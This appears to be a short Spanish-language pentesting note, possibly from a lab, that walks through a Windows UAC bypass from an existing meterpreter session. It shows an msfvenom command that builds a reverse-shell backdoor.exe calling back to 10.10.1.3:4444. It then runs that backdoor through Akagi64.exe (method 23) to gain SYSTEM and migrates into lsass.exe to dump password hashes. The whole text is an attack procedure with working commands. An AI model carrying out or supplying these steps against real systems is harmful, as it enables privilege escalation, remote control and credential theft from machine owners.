Supongamos que estamos dentro de una sesión de meterpreter de una máquina Windows:
![[Pasted image 20240612161102.png]]

Y queremos ejecutar el comando getsystem, donde veremos que nos da error porque ha saltado el UAC:
![[Pasted image 20240612161106.png]]

Por tanto, el primer paso será generar el payload con msfvenom en formato .exe, para pasárselo a la herramienta que usaremos más tarde:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
```

![[Pasted image 20240612161113.png]]
Y ahora subimos este payload como también la herramienta para hacer el bypass llamada Akagi64.exe, ubicándonos en /temp porque allí tenemos permisos de escritura:
![[Pasted image 20240612161118.png]]

![[Pasted image 20240612161122.png]]

Una vez hecho esto, nos pondremos otra vez en escucha con metasploit para recibir esta nueva conexión:
![[Pasted image 20240612161145.png]]

Y ahora desde la otra sesión de meterpreter, ejecutamos el Akagi64.exe pasándole la backdoor.exe que hemos subido anteriormente:
```bash
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

Recibimos la conexión y ahora sí podemos ejecutar el comando getsystem:
![[Pasted image 20240612161207.png]]

Y también podemos migrarnos al proceso lsass.exe para dumpear hashes:
![[Pasted image 20240612161211.png]]
![[Pasted image 20240612161214.png]]
